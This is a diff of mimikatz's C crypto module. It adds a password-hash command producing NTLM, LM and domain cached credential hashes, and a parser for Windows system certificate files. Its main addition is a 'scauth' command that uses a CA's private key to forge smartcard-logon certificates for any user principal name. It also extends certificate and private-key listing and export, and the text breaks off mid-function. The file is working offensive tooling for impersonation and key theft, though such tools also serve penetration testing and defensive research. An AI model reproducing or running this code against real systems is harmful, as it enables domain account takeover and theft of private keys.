@@ -1,7 +1,7 @@
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
+	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_crypto.h"
 
@@ -14,6 +14,9 @@ const KUHL_M_C kuhl_m_c_crypto[] = {
 	{kuhl_m_crypto_l_stores,		L"stores",			L"List cryptographic stores"},
 	{kuhl_m_crypto_l_certificates,	L"certificates",	L"List (or export) certificates"},
 	{kuhl_m_crypto_l_keys,			L"keys",			L"List (or export) keys containers"},
+	{kuhl_m_crypto_hash,			L"hash",			L"Hash a password with optional username"},
+	{kuhl_m_crypto_system,			L"system",			L"Describe a Windows System Certificate (file, TODO:registry or hive)"},
+	{kuhl_m_crypto_c_sc_auth,		L"scauth",			L"Create a authentication certitifate (smartcard like) from a CA"},
 
 	{kuhl_m_crypto_p_capi,			L"capi",			L"[experimental] Patch CryptoAPI layer for easy export"},
 	{kuhl_m_crypto_p_cng,			L"cng",				L"[experimental] Patch CNG service for easy export"},
@@ -98,6 +101,7 @@ NTSTATUS kuhl_m_crypto_l_providers(int argc, wchar_t * argv[])
 {
 	DWORD provType,tailleRequise, index = 0;
 	wchar_t * monProvider;
+	PCWCHAR name;
 	PCRYPT_PROVIDERS pBuffer = NULL;
 
 	kprintf(L"\nCryptoAPI providers :\n");
@@ -106,13 +110,34 @@ NTSTATUS kuhl_m_crypto_l_providers(int argc, wchar_t * argv[])
 		if(monProvider = (wchar_t *) LocalAlloc(LPTR, tailleRequise))
 		{
 			if(CryptEnumProviders(index, NULL, 0, &provType, monProvider, &tailleRequise))
-				kprintf(L"%2u. %s\n", index, monProvider);
+			{
+				name = kull_m_crypto_provider_type_to_name(provType);
+				kprintf(L"%2u. %-13s (%2u) - %s\n", index, name ? name : L"?", provType, monProvider);
+			}
 			LocalFree(monProvider);
 		}
 		index++;
 	}
 	if(GetLastError() != ERROR_NO_MORE_ITEMS)
 		PRINT_ERROR_AUTO(L"CryptEnumProviders");
+
+	index = 0;
+	kprintf(L"\nCryptoAPI provider types:\n");
+	while(CryptEnumProviderTypes(index, NULL, 0, &provType, NULL, &tailleRequise))
+	{
+		if(monProvider = (wchar_t *) LocalAlloc(LPTR, tailleRequise))
+		{
+			if(CryptEnumProviderTypes(index, NULL, 0, &provType, monProvider, &tailleRequise))
+			{
+				name = kull_m_crypto_provider_type_to_name(provType);
+				kprintf(L"%2u. %-13s (%2u) - %s\n", index, name ? name : L"?", provType, monProvider);
+			}
+			LocalFree(monProvider);
+		}
+		index++;
+	}
+	if(GetLastError() != ERROR_NO_MORE_ITEMS)
+		PRINT_ERROR_AUTO(L"CryptEnumProviderTypes");
 
 	if(kuhl_m_crypto_hNCrypt)
 	{
@@ -153,17 +178,20 @@ NTSTATUS kuhl_m_crypto_l_certificates(int argc, wchar_t * argv[])
 {
 	HCERTSTORE hCertificateStore;
 	PCCERT_CONTEXT pCertContext;
-	DWORD i, j, dwSizeNeeded, keySpec;
+	DWORD i, j, dwSizeNeeded, keySpec, flags = CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG;
 	wchar_t *certName;
 	PCRYPT_KEY_PROV_INFO pBuffer;
 	HCRYPTPROV_OR_NCRYPT_KEY_HANDLE monProv;
 	HCRYPTKEY maCle;
-	BOOL keyToFree;
+	BOOL noKey, keyToFree;
 
-	PCWCHAR szSystemStore, szStore;
+	PCWCHAR szSystemStore, szStore, name;
 	DWORD dwSystemStore = 0;
 
 	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
+	if(kull_m_string_args_byName(argc, argv, L"silent", NULL, NULL))
+		flags |= CRYPT_ACQUIRE_SILENT_FLAG;
+	noKey = kull_m_string_args_byName(argc, argv, L"nokey", NULL, NULL);
 
 	kull_m_string_args_byName(argc, argv, L"systemstore", &szSystemStore, L"CURRENT_USER"/*kuhl_m_crypto_system_stores[0].name*/);
 	dwSystemStore = kull_m_crypto_system_store_to_dword(szSystemStore);
@@ -176,7 +204,7 @@ NTSTATUS kuhl_m_crypto_l_certificates(int argc, wchar_t * argv[])
 
 	if(hCertificateStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, (HCRYPTPROV_LEGACY) NULL, dwSystemStore | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, szStore))
 	{
-		for (i = 0, pCertContext = CertEnumCertificatesInStore(hCertificateStore, NULL); pCertContext != NULL; pCertContext = CertEnumCertificatesInStore(hCertificateStore, pCertContext), i++)
+		for (i = 0, pCertContext = CertEnumCertificatesInStore(hCertificateStore, NULL); pCertContext != NULL; pCertContext = CertEnumCertificatesInStore(hCertificateStore, pCertContext), i++) // implicit CertFreeCertificateContext
 		{
 			for(j = 0; j < ARRAYSIZE(nameSrc); j++)
 			{
@@ -188,7 +216,6 @@ NTSTATUS kuhl_m_crypto_l_certificates(int argc, wchar_t * argv[])
 						if(CertGetNameString(pCertContext, nameSrc[j], 0, NULL, certName, dwSizeNeeded) == dwSizeNeeded)
 						{
 							kprintf(L"%2u. %s\n", i, certName);
-
 							dwSizeNeeded = 0;
 							if(CertGetCertificateContextProperty(pCertContext, CERT_KEY_PROV_INFO_PROP_ID, NULL, &dwSizeNeeded))
 							{
@@ -196,40 +223,46 @@ NTSTATUS kuhl_m_crypto_l_certificates(int argc, wchar_t * argv[])
 								{
 									if(CertGetCertificateContextProperty(pCertContext, CERT_KEY_PROV_INFO_PROP_ID, pBuffer, &dwSizeNeeded))
 									{
+										name = kull_m_crypto_provider_type_to_name(pBuffer->dwProvType);
 										kprintf(
 											L"\tKey Container  : %s\n"
-											L"\tProvider       : %s\n",
+											L"\tProvider       : %s\n"
+											L"\tProvider type  : %s (%u)\n",
 											(pBuffer->pwszContainerName ? pBuffer->pwszContainerName : L"(null)"),
-											(pBuffer->pwszProvName ? pBuffer->pwszProvName : L"(null)"));
+											(pBuffer->pwszProvName ? pBuffer->pwszProvName : L"(null)"),
+											name ? name : L"?", pBuffer->dwProvType);
 										
-										if(CryptAcquireCertificatePrivateKey(pCertContext, CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG /* CRYPT_ACQUIRE_SILENT_FLAG NULL */, NULL, &monProv, &keySpec, &keyToFree))
+										if(!noKey)
 										{
-											kprintf(L"\tType           : %s (0x%08x)\n", kull_m_crypto_keytype_to_str(keySpec), keySpec);
-
-											if(keySpec != CERT_NCRYPT_KEY_SPEC)
+											if(CryptAcquireCertificatePrivateKey(pCertContext, flags, NULL, &monProv, &keySpec, &keyToFree))
 											{
-												if(CryptGetUserKey(monProv, keySpec, &maCle))
+												kprintf(L"\tType           : %s (0x%08x)\n", kull_m_crypto_keytype_to_str(keySpec), keySpec);
+
+												if(keySpec != CERT_NCRYPT_KEY_SPEC)
 												{
-													kuhl_m_crypto_printKeyInfos(0, maCle);
-													CryptDestroyKey(maCle);
+													if(CryptGetUserKey(monProv, keySpec, &maCle))
+													{
+														kuhl_m_crypto_printKeyInfos(0, maCle);
+														CryptDestroyKey(maCle);
+													}
+													else PRINT_ERROR_AUTO(L"CryptGetUserKey");
+
+													if(keyToFree)
+														CryptReleaseContext(monProv, 0);
 												}
-												else PRINT_ERROR_AUTO(L"CryptGetUserKey");
+												else if(kuhl_m_crypto_hNCrypt)
+												{
+													kuhl_m_crypto_printKeyInfos(monProv, 0);
+													if(keyToFree)
+														K_NCryptFreeObject(monProv);
+												}
+												else PRINT_ERROR(L"keySpec == CERT_NCRYPT_KEY_SPEC without CNG Handle ?\n");
 
-												if(keyToFree)
-													CryptReleaseContext(monProv, 0);
-											}
-											else if(kuhl_m_crypto_hNCrypt)
-											{
-												kuhl_m_crypto_printKeyInfos(monProv, 0);
-												if(keyToFree)
-													K_NCryptFreeObject(monProv);
-											}
-											else PRINT_ERROR(L"keySpec == CERT_NCRYPT_KEY_SPEC without CNG Handle ?\n");
-
-										} else PRINT_ERROR_AUTO(L"CryptAcquireCertificatePrivateKey");
+											} else PRINT_ERROR_AUTO(L"CryptAcquireCertificatePrivateKey");
+										}
 									} else PRINT_ERROR_AUTO(L"CertGetCertificateContextProperty");
+									LocalFree(pBuffer);
 								}
-								LocalFree(pBuffer);
 								if(!export)
 									kprintf(L"\n");
 							}
@@ -283,6 +316,9 @@ NTSTATUS kuhl_m_crypto_l_keys(int argc, wchar_t * argv[])
 		dwFlags = CRYPT_MACHINE_KEYSET; // same as NCRYPT_MACHINE_KEY_FLAG :)
 	szStore = dwFlags ? L"machine" : L"user";
 	
+	if(kull_m_string_args_byName(argc, argv, L"silent", NULL, NULL))
+		dwFlags |= CRYPT_SILENT;
+
 	kull_m_string_args_byName(argc, argv, L"cngprovider", &szCngProvider, MS_KEY_STORAGE_PROVIDER);
 
 	kprintf(L" * Store         : \'%s\'\n"	
@@ -559,7 +595,7 @@ void kuhl_m_crypto_exportCert(PCCERT_CONTEXT pCertificate, BOOL havePrivateKey, 
 			isExported = FALSE;
 			if(CertAddCertificateContextToStore(hTempStore, pCertificate, CERT_STORE_ADD_NEW, &pCertContextCopy))
 			{
-				isExported = kuhl_m_crypto_exportPfx(hTempStore, fileNameBuffer);
+				isExported = kull_m_crypto_exportPfx(hTempStore, fileNameBuffer);
 				CertFreeCertificateContext(pCertContextCopy);
 			}
 			kprintf(L"\tPrivate export : %s - ", isExported ? L"OK" : L"KO");
@@ -572,60 +608,6 @@ void kuhl_m_crypto_exportCert(PCCERT_CONTEXT pCertificate, BOOL havePrivateKey, 
 	}
 	kprintf(L"\n");
 	CertCloseStore(hTempStore, CERT_CLOSE_STORE_FORCE_FLAG);
-}
-
-BOOL kuhl_m_crypto_exportPfx(HCERTSTORE hStore, LPCWSTR filename)
-{
-	BOOL isExported = FALSE;
-	CRYPT_DATA_BLOB bDataBlob = {0, NULL};
-	if(PFXExportCertStoreEx(hStore, &bDataBlob, MIMIKATZ, NULL, EXPORT_PRIVATE_KEYS | REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY))
-	{
-		if(bDataBlob.pbData = (BYTE *) LocalAlloc(LPTR, bDataBlob.cbData))
-		{
-			if(PFXExportCertStoreEx(hStore, &bDataBlob, MIMIKATZ, NULL, EXPORT_PRIVATE_KEYS | REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY))
-				isExported = kull_m_file_writeData(filename, bDataBlob.pbData, bDataBlob.cbData);
-			LocalFree(bDataBlob.pbData);
-		}
-	}
-	if(!isExported)
-		PRINT_ERROR_AUTO(L"PFXExportCertStoreEx");
-	return isExported;
-}
-
-BOOL kuhl_m_crypto_DerAndKeyToPfx(LPCVOID der, DWORD derLen, LPCVOID key, DWORD keyLen, BOOL isPvk, LPCWSTR filename) // no PVK support at this time
-{
-	BOOL isExported = FALSE;
-	CRYPT_KEY_PROV_INFO infos = {NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, 0, 0, NULL, AT_KEYEXCHANGE};
-	HCRYPTPROV hCryptProv;
-	HCRYPTKEY hCryptKey;
-	PCCERT_CONTEXT pCertContext;
-	HCERTSTORE hTempStore = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, 0, CERT_STORE_CREATE_NEW_FLAG, NULL); 			
-
-	if(infos.pwszContainerName = kull_m_string_getRandomGUID())
-	{
-		if(CertAddEncodedCertificateToStore(hTempStore, X509_ASN_ENCODING, (LPCBYTE) der, derLen, CERT_STORE_ADD_NEW, &pCertContext))
-		{
-			if(CryptAcquireContext(&hCryptProv, infos.pwszContainerName, infos.pwszProvName, infos.dwProvType, CRYPT_NEWKEYSET))
-			{
-				if(CryptImportKey(hCryptProv, (LPCBYTE) key,  keyLen, 0, CRYPT_EXPORTABLE, &hCryptKey))
-				{
-					if(CertSetCertificateContextProperty(pCertContext, CERT_KEY_PROV_INFO_PROP_ID, 0, (LPCVOID) &infos))
-						isExported = kuhl_m_crypto_exportPfx(hTempStore, filename);
-					CryptDestroyKey(hCryptKey);
-				}
-				else PRINT_ERROR_AUTO(L"CryptImportKey");
-				CryptReleaseContext(hCryptProv, 0);
-				if(!CryptAcquireContext(&hCryptProv, infos.pwszContainerName, NULL, PROV_RSA_FULL, CRYPT_DELETEKEYSET))
-					PRINT_ERROR(L"Unable to delete temp keyset %s\n", infos.pwszContainerName);
-			}
-			else PRINT_ERROR_AUTO(L"CryptAcquireContext");
-			CertFreeCertificateContext(pCertContext);
-		}
-		else PRINT_ERROR_AUTO(L"CertAddEncodedCertificateToStore");
-		LocalFree(infos.pwszContainerName);
-	}
-	CertCloseStore(hTempStore, CERT_CLOSE_STORE_FORCE_FLAG);
-	return isExported;
 }
 
 wchar_t * kuhl_m_crypto_generateFileName(const wchar_t * term0, const wchar_t * term1, const DWORD index, const wchar_t * name, const wchar_t * ext)
@@ -641,6 +623,421 @@ wchar_t * kuhl_m_crypto_generateFileName(const wchar_t * term0, const wchar_t * 
 			kull_m_file_cleanFilename(buffer);
 	}
 	return buffer;
+}
+
+NTSTATUS kuhl_m_crypto_hash(int argc, wchar_t * argv[])
+{
+	PCWCHAR szCount, szPassword = NULL, szUsername = NULL;
+	UNICODE_STRING uPassword, uUsername, uTmp;
+	ANSI_STRING aTmp;
+	DWORD count = 10240;
+	BYTE hash[LM_NTLM_HASH_LENGTH], dcc[LM_NTLM_HASH_LENGTH], md5[MD5_DIGEST_LENGTH], sha1[SHA_DIGEST_LENGTH], sha2[32];
+	
+	kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL);
+	kull_m_string_args_byName(argc, argv, L"user", &szUsername, NULL);
+	if(kull_m_string_args_byName(argc, argv, L"count", &szCount, NULL))
+		count = wcstoul(szCount, NULL, 0);
+
+	RtlInitUnicodeString(&uPassword, szPassword);
+	RtlInitUnicodeString(&uUsername, szUsername);
+	if(NT_SUCCESS(RtlDigestNTLM(&uPassword, hash)))
+	{
+		kprintf(L"NTLM: "); kull_m_string_wprintf_hex(hash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+		if(szUsername)
+		{
+			if(NT_SUCCESS(kull_m_crypto_get_dcc(dcc, hash, &uUsername, 0)))
+			{
+				kprintf(L"DCC1: "); kull_m_string_wprintf_hex(dcc, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+				if(NT_SUCCESS(kull_m_crypto_get_dcc(dcc, hash, &uUsername, count)))
+				{
+					kprintf(L"DCC2: "); kull_m_string_wprintf_hex(dcc, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+				}
+			}
+		}
+	}
+
+	if(NT_SUCCESS(RtlUpcaseUnicodeString(&uTmp, &uPassword, TRUE)))
+	{
+		if(NT_SUCCESS(RtlUnicodeStringToAnsiString(&aTmp, &uTmp, TRUE)))
+		{
+			if(NT_SUCCESS(RtlDigestLM(aTmp.Buffer, hash)))
+			{
+				kprintf(L"LM  : "); kull_m_string_wprintf_hex(hash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+			}
+			RtlFreeAnsiString(&aTmp);
+		}
+		RtlFreeUnicodeString(&uTmp);
+	}
+
+	if(kull_m_crypto_hash(CALG_MD5, uPassword.Buffer, uPassword.Length, md5, MD5_DIGEST_LENGTH))
+		kprintf(L"MD5 : "); kull_m_string_wprintf_hex(md5, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
+	if(kull_m_crypto_hash(CALG_SHA1, uPassword.Buffer, uPassword.Length, sha1, SHA_DIGEST_LENGTH))
+		kprintf(L"SHA1: "); kull_m_string_wprintf_hex(sha1, SHA_DIGEST_LENGTH, 0); kprintf(L"\n");
+	if(kull_m_crypto_hash(CALG_SHA_256, uPassword.Buffer, uPassword.Length, sha2, 32))
+		kprintf(L"SHA2: "); kull_m_string_wprintf_hex(sha2, 32, 0); kprintf(L"\n");
+
+	return STATUS_SUCCESS;
+}
+
+BOOL kuhl_m_crypto_system_data(PBYTE data, DWORD len, PCWCHAR originalName, BOOL isExport)
+{
+	BOOL status = FALSE;
+	PCWCHAR name;
+	PKUHL_M_CRYPTO_CERT_PROP prop;
+	PKUHL_M_CRYPTO_CRYPT_KEY_PROV_INFO provInfo;
+
+	for(prop = (PKUHL_M_CRYPTO_CERT_PROP) data; (PBYTE) prop < (data + len); prop = (PKUHL_M_CRYPTO_CERT_PROP) ((PBYTE) prop + FIELD_OFFSET(KUHL_M_CRYPTO_CERT_PROP, data) + prop->size))
+	{
+		name = kull_m_crypto_cert_prop_id_to_name(prop->dwPropId);
+		kprintf(L"[%04x/%x] %s\n", prop->dwPropId, prop->flags, name ? name : L"?");
+		if(prop->size)
+		{
+			kprintf(L"  ");
+			switch(prop->dwPropId)
+			{
+			case CERT_KEY_PROV_INFO_PROP_ID:
+				kprintf(L"Provider info:\n");
+				provInfo = (PKUHL_M_CRYPTO_CRYPT_KEY_PROV_INFO) prop->data;
+				if(provInfo->offsetContainerName)
+					kprintf(L"\tKey Container  : %s\n", prop->data + provInfo->offsetContainerName);
+				if(provInfo->offsetProvName)
+					kprintf(L"\tProvider       : %s\n", prop->data + provInfo->offsetProvName);
+				name = kull_m_crypto_provider_type_to_name(provInfo->dwProvType);
+				kprintf(L"\tProvider type  : %s (%u)\n", name ? name : L"?", provInfo->dwProvType);
+				kprintf(L"\tType           : %s (0x%08x)\n", kull_m_crypto_keytype_to_str(provInfo->dwKeySpec), provInfo->dwKeySpec);
+				kprintf(L"\tFlags          : %08x\n", provInfo->dwFlags);
+				kprintf(L"\tParam (todo)   : %08x / %08x\n", provInfo->cProvParam, provInfo->offsetRgProvParam);
+				break;
+			case CERT_FRIENDLY_NAME_PROP_ID:
+			case CERT_OCSP_CACHE_PREFIX_PROP_ID:
+			case 101: //CERT_SMART_CARD_READER_PROP_ID
+				kprintf(L"%.*s", prop->size / sizeof(wchar_t), prop->data);
+				break;
+			case CERT_cert_file_element:
+			case CERT_crl_file_element:
+			case CERT_ctl_file_element:
+			case CERT_keyid_file_element:
+				kuhl_m_crypto_file_rawData(prop, originalName, isExport);
+				break;
+			case CERT_SHA1_HASH_PROP_ID:
+			case CERT_MD5_HASH_PROP_ID :
+			case CERT_SIGNATURE_HASH_PROP_ID:
+			case CERT_ISSUER_PUBLIC_KEY_MD5_HASH_PROP_ID:
+			case CERT_SUBJECT_PUBLIC_KEY_MD5_HASH_PROP_ID:
+			case CERT_ISSUER_SERIAL_NUMBER_MD5_HASH_PROP_ID:
+			case CERT_SUBJECT_NAME_MD5_HASH_PROP_ID:
+			case CERT_KEY_IDENTIFIER_PROP_ID:
+				//
+			default:
+				kull_m_string_wprintf_hex(prop->data, prop->size, 0);
+				break;
+			}
+			kprintf(L"\n");
+		}
+	}
+
+	return status;
+}
+
+BOOL CALLBACK kuhl_m_crypto_system_directory(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg)
+{
+	PBYTE fileData;
+	DWORD fileLenght;
+	if(fullpath)
+	{
+		kprintf(L"\n* File: \'%s\'\n", fullpath);
+		if(kull_m_file_readData(fullpath, &fileData, &fileLenght))
+		{
+			kuhl_m_crypto_system_data(fileData, fileLenght, fullpath, *(PBOOL) pvArg);
+			LocalFree(fileData);
+		}
+	}
+	return TRUE;
+}
+
+NTSTATUS kuhl_m_crypto_system(int argc, wchar_t * argv[])
+{
+	BOOL isExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
+	PCWCHAR infile;
+
+	if(kull_m_string_args_byName(argc, argv, L"file", &infile, NULL)) // TODO: registry & hive
+	{
+		if(PathIsDirectory(infile))
+		{
+			kprintf(L"* Directory: \'%s\'\n", infile);
+			kull_m_file_Find(infile, NULL, FALSE, 0, FALSE, kuhl_m_crypto_system_directory, &isExport);
+		}
+		else
+			kuhl_m_crypto_system_directory(0, infile, PathFindFileName(infile), &isExport);
+	}
+	else PRINT_ERROR(L"Input Microsoft Crypto Certificate file needed (/file:filename|directory)\n");
+	return STATUS_SUCCESS;
+}
+
+void kuhl_m_crypto_file_rawData(PKUHL_M_CRYPTO_CERT_PROP prop, PCWCHAR inFile, BOOL isExport)
+{
+	PCWCHAR type, file = PathFindFileName(inFile);
+	wchar_t * buffer;
+	size_t charCount;
+
+	switch(prop->dwPropId)
+	{
+	case CERT_cert_file_element:
+		type = L"der";
+		break;
+	case CERT_crl_file_element:
+		type = L"crl";
+		break;
+	case CERT_ctl_file_element:
+		type = L"ctl";
+		break;
+	case CERT_keyid_file_element:
+		type = L"keyid";
+		break;
+	default:
+		type = NULL;
+	}
+
+	if(type)
+	{
+		kprintf(L"Data: ");
+		kull_m_string_wprintf_hex(prop->data, prop->size, 0);
+		kprintf(L"\n");
+		if(isExport)
+		{
+			kprintf(L"  ");
+			charCount = wcslen(file) + 1 + wcslen(type) + 1;
+			if(buffer = (wchar_t *) LocalAlloc(LPTR, (charCount) * sizeof(wchar_t)))
+			{
+				if(swprintf_s(buffer, charCount, L"%s.%s", file, type) > 0)
+				{
+					if(kull_m_file_writeData(buffer, prop->data, prop->size))
+						kprintf(L"Saved to file: %s\n", buffer);
+					else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+				}
+				LocalFree(buffer);
+			}
+		}
+	}
+}
+
+BOOL kuhl_m_crypto_c_sc_auth_quickEncode(__in LPCSTR lpszStructType, __in const void *pvStructInfo, PDATA_BLOB data)
+{
+	BOOL status = FALSE;
+	data->cbData = 0;
+	data->pbData = NULL;
+	if(CryptEncodeObject(PKCS_7_ASN_ENCODING | X509_ASN_ENCODING, lpszStructType, pvStructInfo, NULL, &data->cbData))
+	{
+		if(data->pbData = (PBYTE) LocalAlloc(LPTR, data->cbData))
+		{
+			if(!(status = CryptEncodeObject(PKCS_7_ASN_ENCODING | X509_ASN_ENCODING, lpszStructType, pvStructInfo, data->pbData, &data->cbData)))
+			{
+				PRINT_ERROR_AUTO(L"CryptEncodeObject (data)");
+				LocalFree(data->pbData);
+			}
+		}
+	}
+	else PRINT_ERROR_AUTO(L"CryptEncodeObject (init)");
+	return status;
+}
+
+BOOL kuhl_m_crypto_c_sc_auth_Ext_AltUPN(PCERT_EXTENSION pCertExtension, LPCWSTR upn)
+{
+	BOOL status = FALSE;
+	CERT_NAME_VALUE otherNameValue = {CERT_RDN_UTF8_STRING, (DWORD) wcslen(upn) * sizeof(wchar_t), (PBYTE) upn};
+	CERT_OTHER_NAME otherName = {szOID_NT_PRINCIPAL_NAME, {0, NULL}};
+	CERT_ALT_NAME_ENTRY altName = {CERT_ALT_NAME_OTHER_NAME, &otherName};
+	CERT_ALT_NAME_INFO AltName = {1, &altName};
+	pCertExtension->pszObjId = szOID_SUBJECT_ALT_NAME2;
+	pCertExtension->fCritical = FALSE;
+	if(kuhl_m_crypto_c_sc_auth_quickEncode(X509_UNICODE_ANY_STRING, &otherNameValue, &otherName.Value))
+	{
+		status = kuhl_m_crypto_c_sc_auth_quickEncode(pCertExtension->pszObjId, &AltName, &pCertExtension->Value);
+		LocalFree(otherName.Value.pbData);
+	}
+	return status;
+}
+
+BOOL kuhl_m_crypto_c_sc_auth_Ext_KU(PCERT_EXTENSION pCertExtension, WORD bits)
+{
+	CRYPT_BIT_BLOB bit = {sizeof(bits), (PBYTE) &bits, 5};
+	pCertExtension->pszObjId = szOID_KEY_USAGE;
+	pCertExtension->fCritical = TRUE;
+	return kuhl_m_crypto_c_sc_auth_quickEncode(pCertExtension->pszObjId, &bit, &pCertExtension->Value);
+}
+
+BOOL kuhl_m_crypto_c_sc_auth_Ext_EKU(PCERT_EXTENSION pCertExtension, DWORD count, ...)
+{
+	BOOL status = FALSE;
+	DWORD i;
+	va_list vaList;
+	CERT_ENHKEY_USAGE usage = {count, NULL};
+	pCertExtension->pszObjId = szOID_ENHANCED_KEY_USAGE;
+	pCertExtension->fCritical = FALSE;
+	if(usage.rgpszUsageIdentifier = (LPSTR *) LocalAlloc(LPTR, sizeof(LPSTR) * count))
+	{
+		va_start(vaList, count); 
+		for(i = 0; i < count; i++)
+			usage.rgpszUsageIdentifier[i] =  va_arg(vaList, LPSTR);
+		va_end(vaList);
+		status = kuhl_m_crypto_c_sc_auth_quickEncode(pCertExtension->pszObjId, &usage, &pCertExtension->Value);
+		LocalFree(usage.rgpszUsageIdentifier);
+	}
+	return status;
+}
+
+__inline void kuhl_m_crypto_c_sc_auth_Ext_Free(PCERT_EXTENSION pCertExtension)
+{
+	if(pCertExtension->Value.pbData)
+		LocalFree(pCertExtension->Value.pbData);
+}
+
+NTSTATUS kuhl_m_crypto_c_sc_auth(int argc, wchar_t * argv[])
+{
+	LPCWSTR szStoreCA, szNameCA, szUPN, szPfx = NULL;
+	HCERTSTORE hCertStoreCA;
+	PCCERT_CONTEXT pCertCtxCA;
+	HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hKeyCA;
+	DWORD dwKeySpecCA;
+	BOOL bToFreeCA, isExported = FALSE;
+
+	HCRYPTPROV hProvCERT;
+	HCRYPTKEY hKeyCERT;
+	BYTE SerialNumber[LM_NTLM_HASH_LENGTH];
+	CERT_RDN_ATTR rgNameAttr[] = {
+		{szOID_COMMON_NAME, CERT_RDN_UNICODE_STRING, {0, NULL}},
+		{szOID_ORGANIZATION_NAME, CERT_RDN_UNICODE_STRING, {sizeof(MIMIKATZ) - sizeof(wchar_t), (PBYTE) MIMIKATZ}},
+		{szOID_COUNTRY_NAME, CERT_RDN_UNICODE_STRING, {sizeof(L"FR") - sizeof(wchar_t), (PBYTE) L"FR"}},
+	};
+	CERT_RDN rgRDN = {ARRAYSIZE(rgNameAttr), rgNameAttr};
+	CERT_NAME_INFO Name = {1, &rgRDN};
+	CERT_EXTENSION Extensions[3] = {0}; // EKU, KU, AltNames
+	DWORD cbPublicKeyInfo;
+	PCERT_PUBLIC_KEY_INFO pbPublicKeyInfo;
+	CRYPT_KEY_PROV_INFO keyInfos = {NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_SILENT, 0, NULL, AT_KEYEXCHANGE};
+
+	CERT_INFO CertInfo = {0};
+	DWORD szCertificate = 0;
+	PBYTE Certificate = NULL;
+
+	if(keyInfos.pwszContainerName = kull_m_string_getRandomGUID())
+	{
+		CertInfo.dwVersion = CERT_V3;
+		CertInfo.SerialNumber.cbData = sizeof(SerialNumber);
+		CertInfo.SerialNumber.pbData = SerialNumber;
+		CertInfo.cExtension = ARRAYSIZE(Extensions);
+		CertInfo.rgExtension = Extensions;
+		CDGenerateRandomBits(CertInfo.SerialNumber.pbData, CertInfo.SerialNumber.cbData);
+
+		kull_m_string_args_byName(argc, argv, L"castore", &szStoreCA, L"LOCAL_MACHINE");
+		if(kull_m_string_args_byName(argc, argv, L"caname", &szNameCA, NULL))
+		{
+			if(kull_m_string_args_byName(argc, argv, L"upn", &szUPN, NULL))
+			{
+				rgNameAttr[0].Value.cbData = (DWORD) wcslen(szUPN) * sizeof(wchar_t);
+				rgNameAttr[0].Value.pbData = (PBYTE) szUPN;
+				kprintf(L"CA store       : %s\n", szStoreCA);
+				if(hCertStoreCA = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, (HCRYPTPROV_LEGACY) NULL, kull_m_crypto_system_store_to_dword(szStoreCA) | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, L"My"))
+				{
+					kprintf(L"CA name        : %s\n", szNameCA);
+					if(pCertCtxCA = CertFindCertificateInStore(hCertStoreCA, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0, CERT_FIND_SUBJECT_STR, szNameCA, NULL))
+					{
+						kprintf(L"CA validity    : "); kull_m_string_displayLocalFileTime(&pCertCtxCA->pCertInfo->NotBefore);
+						kprintf(L" -> "); kull_m_string_displayLocalFileTime(&pCertCtxCA->pCertInfo->NotAfter); kprintf(L"\n");
+						if(CryptAcquireCertificatePrivateKey(pCertCtxCA, CRYPT_ACQUIRE_CACHE_FLAG | CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG, NULL, &hKeyCA, &dwKeySpecCA, &bToFreeCA))
+						{
+							CertInfo.Issuer = pCertCtxCA->pCertInfo->Subject;
+							CertInfo.IssuerUniqueId = pCertCtxCA->pCertInfo->SubjectUniqueId;
+							CertInfo.NotBefore = pCertCtxCA->pCertInfo->NotBefore;
+							CertInfo.NotAfter = pCertCtxCA->pCertInfo->NotAfter;
+							CertInfo.SignatureAlgorithm = pCertCtxCA->pCertInfo->SignatureAlgorithm;
+							kprintf(L"Certificate UPN: %s\n", szUPN);
+							if(kuhl_m_crypto_c_sc_auth_quickEncode(X509_NAME, &Name, &CertInfo.Subject))
+							{
+								if(kuhl_m_crypto_c_sc_auth_Ext_EKU(&Extensions[0], 2, szOID_KP_SMARTCARD_LOGON, szOID_PKIX_KP_CLIENT_AUTH))
+								{
+									if(kuhl_m_crypto_c_sc_auth_Ext_KU(&Extensions[1], CERT_DIGITAL_SIGNATURE_KEY_USAGE | CERT_KEY_ENCIPHERMENT_KEY_USAGE))
+									{
+										if(kuhl_m_crypto_c_sc_auth_Ext_AltUPN(&Extensions[2], szUPN))
+										{
+											kprintf(L"Key container  : %s\n", keyInfos.pwszContainerName);
+											kprintf(L"Key provider   : %s\n", keyInfos.pwszProvName);
+											if(CryptAcquireContext(&hProvCERT, keyInfos.pwszContainerName, keyInfos.pwszProvName, keyInfos.dwProvType, CRYPT_NEWKEYSET | keyInfos.dwFlags))
+											{
+												if(CryptGenKey(hProvCERT, keyInfos.dwKeySpec, CRYPT_EXPORTABLE | (RSA1024BIT_KEY * 2), &hKeyCERT))
+												{
+													if(CryptExportPublicKeyInfo(hProvCERT, keyInfos.dwKeySpec, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, NULL, &cbPublicKeyInfo))
+													{
